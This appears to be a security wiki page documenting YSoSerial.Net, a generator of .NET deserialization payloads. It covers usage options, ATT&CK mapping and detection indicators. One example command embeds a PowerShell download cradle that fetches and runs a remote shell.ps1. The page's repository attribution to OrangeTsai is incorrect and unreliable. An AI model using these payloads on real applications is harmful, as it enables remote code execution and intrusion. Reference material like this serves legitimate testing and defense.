---
type: tool
verified: true
platforms:
  - Windows
tags:
  - deserialization
url: 'https://github.com/OrangeTsai/ysoserial.net'
commands:
  - '[[commands/ysoserial-generate-deserialization-payload]]'
validated: true
---

# YSoSerial.Net

**Status**: ✓ Verified

## Overview

YSoSerial.Net is a tool for generating .NET deserialization payloads using gadget chains from common .NET libraries. It is used to exploit unsafe deserialization vulnerabilities in .NET applications, allowing arbitrary command execution when the serialized payload is deserialized by a vulnerable application.

## Description

The tool provides a collection of property-oriented programming (POP) gadget chains discovered in popular .NET libraries. The main executable takes a user-specified command, wraps it in a chosen gadget chain, and serializes the object to stdout in various formats. If an application deserializes this data without proper validation and has the required libraries loaded, the gadget chain triggers, executing the specified command on the host system. Common use cases include exploiting web applications vulnerable to deserialization in formats like JSON.NET, BinaryFormatter, or XML.

## Features

- Supports multiple gadget chains (e.g., ObjectDataProvider, DataSet, TypeConfuseDelegate)
- Output formats including raw, base64, and hex
- Command execution wrapping for PowerShell, CMD, or custom payloads
- Windows-focused but adaptable for .NET Core cross-platform scenarios
- No runtime dependencies beyond .NET Framework

## Installation

### Requirements

- Microsoft Visual Studio Community 2019 or later with ".NET desktop development" workload
- Git for cloning the repository
- .NET Framework 4.0 or higher

### Install Commands

```cmd
git clone https://github.com/OrangeTsai/ysoserial.net.git
cd ysoserial.net
```

Open `ysoserial.sln` in Visual Studio:
1. Set configuration to "Release"
2. Select "Build" > "Rebuild Solution"

The compiled `ysoserial.exe` will be in `bin\Release\`.

Alternatively, download pre-compiled releases from the GitHub repository if available.

## Basic Usage

```cmd
ysoserial.exe -h
```

### Common Options

| Option | Description |
|--------|-------------|
| `-f, --formatter` | Specify the serialization formatter (e.g., Json.Net, BinaryFormatter) |
| `-g, --gadget` | Choose the gadget chain (e.g., ObjectDataProvider, DataSet) |
| `-o, --output` | Output format (raw, base64, hex) |
| `-c, --command` | Command to execute on deserialization |
| `-h, --help` | Show help message |

## Examples

### Example 1: Basic Usage

Generate a JSON.NET payload using ObjectDataProvider gadget to execute a PowerShell download cradle:

```cmd
ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "powershell -ep bypass iex(New-Object Net.WebClient).DownloadString('http://10.10.10.100/shell.ps1')"
```

### Example 2: Advanced Usage

Generate a base64-encoded BinaryFormatter payload with a custom gadget:

```cmd
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "calc.exe"
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[PowerShell]] PowerShell
- [[Execution through API]] Native API
- [[Exploitation for Client Execution]] Exploitation for Client or Server Software

### Tactics

- [[Execution]] Execution
- [[Lateral Movement]] Lateral Movement

## Detection

Indicators and methods for detecting this tool's usage:

- Presence of `ysoserial.exe` in process lists or file system
- Network traffic to download cradles or C2 servers post-deserialization
- Anomalous deserialization attempts in application logs (e.g., unexpected object types)
- Monitoring for common gadget classes like `ObjectDataProvider` or `DataSet` in serialized data
- Behavioral analysis: Sudden command execution from deserialization contexts

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Metasploit]]
- [[tools/Burp-Suite]]

## References

- Official GitHub: https://github.com/OrangeTsai/ysoserial.net
- .NET Deserialization Cheatsheet: https://www.invicti.com/blog/web-security/deserialization-cheatsheet/
